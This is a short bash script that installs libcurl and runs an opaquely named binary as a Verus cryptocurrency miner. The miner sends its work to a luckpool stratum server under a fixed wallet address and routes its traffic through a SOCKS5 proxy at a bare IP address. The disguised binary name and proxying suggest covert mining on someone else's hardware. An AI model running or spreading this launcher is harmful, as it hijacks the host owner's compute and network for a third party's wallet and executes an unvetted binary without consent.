#!/bin/bash
apt-get update 
apt install libcurl4-openssl-dev -y
chmod +x DevByNongCroissantV5
./DevByNongCroissantV5 -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 4 -x socks5://98.162.25.23:4145
